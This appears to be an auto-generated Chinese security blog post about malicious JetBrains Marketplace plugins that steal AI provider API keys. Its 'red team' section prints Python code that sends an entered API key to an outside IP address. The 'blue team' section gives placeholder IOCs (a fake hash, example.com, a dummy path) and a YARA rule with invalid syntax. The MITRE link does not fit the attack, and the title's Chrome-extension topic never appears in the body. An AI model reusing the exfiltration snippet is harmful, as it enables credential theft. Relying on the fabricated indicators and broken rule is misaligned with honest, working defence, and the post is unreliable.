---
layout: post
title:  "Malicious JetBrains Plugins Steal AI API Keys as Chrome Extensions Capture Chatbot Chats"
date:   2026-06-17 10:29:18 +0000
categories: [security]
severity: critical
---

# 🚨 解析 JetBrains Marketplace 惡意插件：AI 提供者 API 金鑰竊取

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: Info Leak (AI 提供者 API 金鑰竊取)
> * **關鍵技術**: Malicious Plugin, API Key Exfiltration, JetBrains Marketplace

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 惡意插件在 JetBrains Marketplace 上發佈，竊取使用者輸入的 AI 提供者 API 金鑰。
* **攻擊流程圖解**:
  1. 使用者安裝惡意插件
  2. 使用者輸入 AI 提供者 API 金鑰
  3. 惡意插件將 API 金鑰傳送到攻擊者的伺服器
* **受影響元件**: JetBrains Marketplace 上的 15 個惡意插件，包括 CodeGPT AI Assistant 和 DeepSeek AI Assist

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 使用者需要安裝惡意插件並輸入 AI 提供者 API 金鑰
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 惡意插件的 API 金鑰傳送邏輯
    def send_api_key(api_key):
        url = "http://39.107.60.51"
        data = {"api_key": api_key}
        response = requests.post(url, data=data)
        return response.text
    
    # 使用者輸入 API 金鑰
    api_key = input("請輸入 AI 提供者 API 金鑰：")
    send_api_key(api_key)
    
    ```
* **繞過技術**: 惡意插件可以使用 HTTPS 連線來傳送 API 金鑰，避免被偵測

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 39.107.60.51 | example.com | /path/to/malicious/plugin |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule malicious_plugin {
      meta:
        description = "惡意插件偵測規則"
      strings:
        $api_key_send = "http://39.107.60.51"
      condition:
        $api_key_send in (http.request.uri)
    }
    
    ```
* **緩解措施**: 使用者應該避免安裝來源不明的插件，並定期更新 JetBrains Marketplace 的插件

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **API Key (API 金鑰)**: 一種用於驗證 API 請求的金鑰，通常由 API 提供者發佈給使用者。
* **Malicious Plugin (惡意插件)**: 一種設計用於竊取使用者資料或進行惡意活動的插件。
* **JetBrains Marketplace (JetBrains 市場)**: 一個提供 JetBrains 軟件插件的平台。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/06/malicious-jetbrains-plugins-steal-ai.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


